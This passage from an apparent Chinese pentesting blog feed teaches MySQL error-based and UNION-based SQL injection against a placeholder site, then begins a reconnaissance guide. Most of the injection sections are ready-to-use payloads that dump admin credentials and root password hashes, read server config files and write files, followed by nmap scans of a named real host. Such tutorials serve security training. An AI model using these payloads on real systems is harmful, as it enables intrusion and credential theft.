class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>polygon()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这个查询语句使用了polygon()函数来创建一个多边形对象。它将用户信息作为参数传递给函数，如果成功执行，将返回数据库中的所有记录。</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>multipolygon()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这个查询语句使用了multipolygon()函数来创建一个多多边形对象。它将用户信息作为参数传递给函数，如果成功执行，将返回数据库中的所有记录。</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>linestring()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这个查询语句使用了linestring()函数来创建一个线段对象。它将用户信息作为参数传递给函数，如果成功执行，将返回数据库中的所有记录。</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>multilinestring()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这个查询语句使用了multilinestring()函数来创建一个多线段对象。它将用户信息作为参数传递给函数，如果成功执行，将返回数据库中的所有记录。</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>exp()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这个查询语句使用了<span class="built_in">exp</span>()函数来计算一个数的指数。它将用户信息作为参数传递给函数，如果成功执行，将返回数据库中的所有记录。</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="4、实战报错注入"><a href="#4、实战报错注入" class="headerlink" title="4、实战报错注入"></a>4、实战报错注入</h2><p>1、当前用户名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)))</span><br></pre></td></tr></table></figure><p>2、root密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> mysql.user),<span class="number">0x7e</span>)))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071637489.png" alt="image-20240306171810626"></p><p>3、查询库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>,schema_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"># 查询第二个库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>,schema_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.schemata LIMIT <span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"># 把 <span class="keyword">from</span> information_schema.schemata LIMIT <span class="number">1</span>,<span class="number">1</span>) 这个部分的 <span class="number">1</span> 一直往后推也可以得到所有库的名</span><br></pre></td></tr></table></figure><p>4、查询表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>,table_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() LIMIT <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"># 第二个表</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>,table_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() LIMIT <span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><p>5、查询字段</p><p>查询 admin的表 首先把admin 转换成十六进制 再放到语句去，示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>,column_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x61646D696E</span> LIMIT <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"># 查询第二个字段 <span class="number">0x61646D696E</span> LIMIT <span class="number">0</span>,<span class="number">1</span> 这个<span class="number">0</span> 往后推 </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>,column_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x61646D696E</span> LIMIT <span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><p>6、查询数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http://target_sys.com/mysqlinj.php?id=-1 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line"># updatexml方法查询数据</span><br><span class="line">http://target_sys.com/mysqlinj.php?id=-1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</span><br><span class="line"></span><br><span class="line"># 上面这种查询 只能查询32位 所以有些部分查询不出来。可以先查询密文 或者先查询长度的 再进行字符长度的截取。</span><br><span class="line"># LENGTH 函数 查询长度</span><br><span class="line">http://target_sys.com/mysqlinj.php?id=-1 and updatexml(1,concat(0x7e,(SELECT distinct LENGTH(concat(0x23,username,0x3a,password,0x23)) FROM admin limit 0,1),0x7e),1)</span><br><span class="line"></span><br><span class="line"># SUBSTRING()字符串截取函数，先查询 1-32在查询33-40，后将字符并接起来就是完整的的数据</span><br><span class="line">http://target_sys.com/mysqlinj.php?id=-1 and updatexml(1,concat(0x7e,(SELECT distinct SUBSTRING(concat(0x23,username,0x3a,password,0x23),1,32) FROM admin limit 0,1),0x7e),1)</span><br><span class="line"># 查询33-40 </span><br><span class="line">http://target_sys.com/mysqlinj.php?id=-1 and updatexml(1,concat(0x7e,(SELECT distinct SUBSTRING(concat(0x23,username,0x3a,password,0x23),33,40) FROM admin limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071637953.png" alt="image-20240306163129317"></p><h2 id="5、报错注入读取文件"><a href="#5、报错注入读取文件" class="headerlink" title="5、报错注入读取文件"></a>5、报错注入读取文件</h2><ul><li><p><code>extractvalue</code> 读取文件。读取长度有限制，只读取32位，读取长度短。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="string">&#x27;C:\\inetpub\\wwwroot\\target_sys.com\\data\\config.inc.php&#x27;</span>读取路径目标</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> load_file(<span class="string">&#x27;C:\\inetpub\\wwwroot\\target_sys.com\\data\\config.inc.php&#x27;</span>)),<span class="number">0x7e</span>)))</span><br></pre></td></tr></table></figure></li><li><p><code>exp</code>方法读取。读取长度比<code>extractvalue</code>长，推荐使用<code>exp</code>方法读取。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="string">&#x27;C:\\inetpub\\wwwroot\\target_sys.com\\data\\config.inc.php&#x27;</span>读取目标路径</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> load_file(<span class="string">&#x27;C:\\inetpub\\wwwroot\\target_sys.com\\data\\config.inc.php&#x27;</span>))a)));</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071637988.png" alt="image-20240307142837183"></p><ul><li><p>写文件可以使用<code>exp</code>方法写入。</p><p>只能创建但写不进内容，需搭配别的漏洞使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 写文件默认就是只能写入<span class="number">0</span>（空白）到文件里面</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">and</span>  <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="string">&#x27;hello&#x27;</span>)a)) <span class="keyword">into</span> outfile <span class="string">&#x27;C:\\inetpub\\wwwroot\\target_sys.com\\data\\config.inc.txt&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入篇MySQL+PHP手工注入爆破篇</title>
      <link href="/post/b3088729.html"/>
      <url>/post/b3088729.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入篇MySQL-PHP手工注入爆破篇"><a href="#SQL注入篇MySQL-PHP手工注入爆破篇" class="headerlink" title="SQL注入篇MySQL+PHP手工注入爆破篇"></a>SQL注入篇MySQL+PHP手工注入爆破篇</h1><p>在上面一章mysql+php手工注入篇  在最后用到的一个函数 group_concat()可以将查询的字段的数据查询出来，可以用利这个函数将mysql所有的库名查询出来。</p><h2 id="1、查询所有的库"><a href="#1、查询所有的库" class="headerlink" title="1、查询所有的库"></a>1、查询所有的库</h2><p>这段代码是一个SQL注入攻击的示例。它通过构造一个恶意的URL，将<code>id</code>参数设置为<code>-1</code>，然后使用<code>UNION SELECT</code>语句来执行额外的查询操作。目的是获取目标系统上所有数据库的名称，并将其作为结果返回。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>article.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><p>该代码使用了<code>UNION SELECT</code>语句来合并两个查询结果集：</p><ul><li>第一个查询是原始的查询，即<code>http://target_sys.com/article.php?id=-1</code>，它将返回与<code>id</code>为<code>-1</code>的文章相关的信息。</li><li>第二个查询是恶意的查询，它使用<code>group_concat(SCHEMA_NAME)</code>函数从<code>information_schema.SCHEMATA</code>表中获取所有数据库的名称，并将它们连接成一个字符串。</li></ul><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071640122.png" alt="image-20240306085923816"></p><h2 id="2、查询库里所有的表"><a href="#2、查询库里所有的表" class="headerlink" title="2、查询库里所有的表"></a>2、查询库里所有的表</h2><p>这段代码是一个SQL注入攻击的示例。它通过构造一个恶意的URL，将<code>id</code>参数设置为<code>-1</code>，然后使用<code>UNION SELECT</code>语句来执行额外的查询操作。目的是获取目标系统上当前数据库的所有表的名称，并将其作为结果返回。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>article.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure><p>该代码使用了<code>UNION SELECT</code>语句来合并两个查询结果集：</p><ul><li>第一个查询是原始的查询，即<code>http://target_sys.com/article.php?id=-1</code>，它将返回与<code>id</code>为<code>-1</code>的文章相关的信息。</li><li>第二个查询是恶意的查询，它使用<code>group_concat(TABLE_NAME)</code>函数从<code>information_schema.TABLES</code>表中获取当前数据库中所有表的名称，并将它们连接成一个字符串。</li></ul><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071640781.png" alt="image-20240306090711536"></p><h2 id="3、查询表里所有的字段"><a href="#3、查询表里所有的字段" class="headerlink" title="3、查询表里所有的字段"></a>3、查询表里所有的字段</h2><p>这段代码是一个SQL注入攻击的示例。它通过构造一个恶意的URL，将<code>id</code>参数设置为<code>-1</code>，然后使用<code>UNION SELECT</code>语句来执行额外的查询操作。目的是获取目标系统上名为”admin”的表的所有列的名称，并将其作为结果返回。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 表名要转为<span class="number">16</span>进制</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>article.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(COLUMN_NAME) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="number">0x61646d696e</span></span><br></pre></td></tr></table></figure><p>该代码使用了<code>UNION SELECT</code>语句来合并两个查询结果集：</p><ul><li>第一个查询是原始的查询，即<code>http://target_sys.com/article.php?id=-1</code>，它将返回与<code>id</code>为<code>-1</code>的文章相关的信息。</li><li>第二个查询是恶意的查询，它使用<code>group_concat(COLUMN_NAME)</code>函数从<code>information_schema.COLUMNS</code>表中获取所有列的名称，并将它们连接成一个字符串。</li></ul><p>同时，它还使用了一个条件<code>where TABLE_NAME=0x61646d696e</code>，其中<code>0x61646d696e</code>是表名”admin”的十六进制表示。这个恶意查询的目的是获取目标系统上名为”admin”的表的所有列的名称，并将其作为结果返回。</p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071640451.png" alt="image-20240306093725253"></p><h2 id="4、查询数据"><a href="#4、查询数据" class="headerlink" title="4、查询数据"></a>4、查询数据</h2><p>这段代码是一个SQL注入攻击的示例。它通过构造一个恶意的URL，将<code>id</code>参数设置为<code>-1</code>，然后使用<code>UNION SELECT</code>语句来执行额外的查询操作。目的是获取目标系统上名为”admin”的表的所有用户名和密码，并将其作为结果返回。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>article.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,<span class="number">0x3a</span>,password) <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure><p>该代码使用了<code>UNION SELECT</code>语句来合并两个查询结果集：</p><ul><li>第一个查询是原始的查询，即<code>http://target_sys.com/article.php?id=-1</code>，它将返回与<code>id</code>为<code>-1</code>的文章相关的信息。</li><li>第二个查询是恶意的查询，它使用<code>group_concat(username,0x3a,password)</code>函数从<code>admin</code>表中获取所有用户名和密码，并将它们连接成一个字符串，其中<code>0x3a</code>表示冒号（：），用于分隔用户名和密码。</li></ul><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071640231.png" alt="image-20240306095028224"></p><h2 id="5、查询失败的原因"><a href="#5、查询失败的原因" class="headerlink" title="5、查询失败的原因"></a>5、查询失败的原因</h2><p>这种方面不是通用的，有时候 查询不全 这个原因是字段的大小问题。解决办法 换一个字段查询，或者 用函数查询长度再用字符串函数截取。这种方法将会在下面介绍。</p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071640901.png" alt="image-20240306095242447"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集篇文件和目录的扫描</title>
      <link href="/post/6f93ef5.html"/>
      <url>/post/6f93ef5.html</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集篇文件和目录的扫描"><a href="#信息收集篇文件和目录的扫描" class="headerlink" title="信息收集篇文件和目录的扫描"></a>信息收集篇文件和目录的扫描</h1><p>渗透的本质 就是信息收集的过程，WEB安全对于渗透前提的信息收集是很重要的。可以通过各种手段获取网站的各种信息。 例如 站长个人信息域名相关信息（域名注册邮箱、dns信息、子域名）</p><h2 id="whois信息反查、IP反查、邮箱反查、资产相关"><a href="#whois信息反查、IP反查、邮箱反查、资产相关" class="headerlink" title="whois信息反查、IP反查、邮箱反查、资产相关"></a><strong>whois信息反查、IP反查、邮箱反查、资产相关</strong></h2><p><code>whois xxx</code> xxx:输入域名</p><p><code>whois</code>命令是用于查询域名的详细信息，如IP地址、所有者信息等。它是一个网络协议，用于在域名注册数据库中查找特定域名的注册信息。这个命令通常在命令行界面中使用，可以帮助用户了解一个域名的注册状态、所有者、注册日期、过期日期以及DNS服务器等信息。</p><p><code>whois</code>命令的使用不受限于特定的编程语言，它可以在任何支持网络协议的命令行工具中运行。例如，在Unix或Linux系统中，用户可以直接在终端中输入<code>whois</code>命令来查询信息。在Windows系统中，虽然默认的命令行工具可能不支持<code>whois</code>，但用户可以通过安装第三方工具或使用在线<code>whois</code>查询服务来获取相同信息。示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# whois baidu.com </span><br><span class="line">Domain Name: BAIDU.COM//查询域名</span><br><span class="line">   Registry Domain ID: 11181110_DOMAIN_COM-VRSN//注册域名的ID</span><br><span class="line">   Registrar WHOIS Server: whois.markmonitor.com//域名的注册商服务器</span><br><span class="line">   Registrar URL: http://www.markmonitor.com//注册URL,注册的网站</span><br><span class="line">   Updated Date: 2023-11-30T06:00:19Z//更新时间</span><br><span class="line">   Creation Date: 1999-10-11T11:05:17Z//注册时间</span><br><span class="line">   Registry Expiry Date: 2026-10-11T11:05:17Z</span><br><span class="line">   Registrar: MarkMonitor Inc.</span><br><span class="line">   Registrar IANA ID: 292</span><br><span class="line">   Registrar Abuse Contact Email: abusecomplaints@markmonitor.com//注册邮箱</span><br><span class="line">   Registrar Abuse Contact Phone: +1.2086851750</span><br><span class="line">   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited//域状态</span><br><span class="line">   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited</span><br><span class="line">   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited</span><br><span class="line">   Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited</span><br><span class="line">   Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited</span><br><span class="line">   Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited</span><br><span class="line">   Name Server: NS1.BAIDU.COM//域名的DNS服务器地址</span><br><span class="line">   Name Server: NS2.BAIDU.COM</span><br><span class="line">   Name Server: NS3.BAIDU.COM</span><br><span class="line">   Name Server: NS4.BAIDU.COM</span><br><span class="line">   Name Server: NS7.BAIDU.COM</span><br><span class="line">   DNSSEC: unsigned//表示域名没有使用DNSSEC来保护其DNS记录的安全性</span><br><span class="line">   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/</span><br></pre></td></tr></table></figure><p>也可以通过站长类工具查询：</p><ul><li><a href="https://www.aizhan.com/">爱站</a></li><li><a href="http://tool.chinaz.com/">站长工具</a></li><li><a href="https://www.tianyancha.com/">天眼</a>   &#x2F;&#x2F;资产相关</li><li><a href="http://whois.chinaz.com/?DomainName=qqpk.cn">http://whois.chinaz.com/?DomainName=qqpk.cn</a></li><li>c段查询<a href="http://www.webscan.cc/">http://www.webscan.cc/</a>     &#x2F;&#x2F;查询 0-255 ip反查域名</li><li>超级ping 查询是否用了cdn <a href="http://ping.chinaz.com/www.moonsec.com">http://ping.chinaz.com/www.moonsec.com</a></li></ul><p>域名查询到注册人和注册邮箱，可以通过注册人或注册邮箱反查反查网站和注册人</p><h2 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h2><p>服务器开放的端口 知道端口再查询这个端口有什么服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//nmap 常用</span><br><span class="line">nmap -Pn -sV www.moonsec.com</span><br><span class="line"></span><br><span class="line">nmap -Pn -sV 103.97.177.22</span><br><span class="line"></span><br><span class="line">nmap -Pn -sV 103.97.177.22 –O</span><br><span class="line"></span><br><span class="line">nmap -Pn -sV -A 103.97.177.22 </span><br><span class="line"></span><br><span class="line">nmap -Pn -sV 103.97.177.22 --open -oN moonsec.com.txt</span><br><span class="line"></span><br><span class="line">nmap -p0-65535 